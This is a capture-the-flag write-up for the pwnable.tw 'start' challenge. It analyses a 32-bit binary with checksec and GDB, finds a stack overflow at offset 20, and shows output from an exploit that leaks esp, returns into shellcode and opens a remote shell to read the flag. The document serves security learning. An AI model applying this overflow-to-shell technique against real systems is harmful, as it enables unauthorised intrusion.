# pwnable.tw: start

>  Just a start.
>
> ```
>nc chall.pwnable.tw 10000
> ```
>
> [start](https://pwnable.tw/static/chall/start)



### Examine the basic information

```shell
$ checksec start
[*] '/Users/mindy/Desktop/CTF/binary_exploit/pwnable.tw/01_start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

```shell
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

The executive file is 32-bit and none of the protection is enabled.



### GDB

##### analyze _start

```
gdb-peda$ disas _start
Dump of assembler code for function _start:
   0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
```

clear eax, ebx, ecx, edx

```
   0x08048066 <+6>:	xor    eax,eax
   0x08048068 <+8>:	xor    ebx,ebx
   0x0804806a <+10>:	xor    ecx,ecx
   0x0804806c <+12>:	xor    edx,edx
```

push prameters to stack -> Let's start the CTF:

```
	 0x0804806e <+14>:	push 0x3a465443
	 0x08048073 <+19>:	push   0x20656874
   0x08048078 <+24>:	push   0x20747261
   0x0804807d <+29>:	push   0x74732073
   0x08048082 <+34>:	push   0x2774654c
```

sys_write

```sys_write
   0x08048087 <+39>:	mov    ecx,esp
   0x08048089 <+41>:	mov    dl,0x14
   0x0804808b <+43>:	mov    bl,0x1
   0x0804808d <+45>:	mov    al,0x4
   0x0804808f <+47>:	int    0x80
```

sys_read

```sys_read
   0x08048091 <+49>:	xor    ebx,ebx
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80
```

return to _exit

```
	 0x08048099 <+57>:	add esp,0x14
	 0x0804809c <+60>:	ret    
End of assembler dump.
```

syscall in _start

| name      | eax  | ebx                    | ecx                         | edx                 |
| --------- | ---- | ---------------------- | --------------------------- | ------------------- |
| sys_write | 0x04 | unsigned int fd = 0x01 | const char _user *buf = esp | size_t count = 0x14 |
| sys_read  | 0x03 | unsigned int fd = 0x01 | char _user *buf = esp       | size_t count = 0x3c |

check how the input overwrite the system

```
gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 20
Registers point to pattern buffer:
[ECX] --> offset 0 - size ~40
[ESP] --> offset 24 - size ~16
Pattern buffer found at:
0xffffd124 : offset    0 - size   34 ($sp + -0x18 [-6 dwords])
Reference to pattern buffer not found in memory
```

Input after the 20th character overwrite *ret* and after the 24th character overwrite *esp*.

### Exploit

1. leak *esp*
2. call *sys_execve(‘/bin/sh’)

##### run the exploit file in python3

``` shell
$ python3 solve.py
[*] '/Users/mindy/Desktop/CTF/binary_exploit/pwnable.tw/01_start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
[+] Opening connection to chall.pwnable.tw on port 10000: Done
payload =  b'aaaaaaaaaaaaaaaaaaaa\x87\x80\x04\x08'
ESP =  0xffed5cd0
[*] Switching to interactive mode
\x00\x00\x006_find -name 'flag'
./home/start/flag
$ cat ./home/start/flag
FLAG{......}
$ 
[*] Interrupted
[*] Closed connection to chall.pwnable.tw port 10000
```

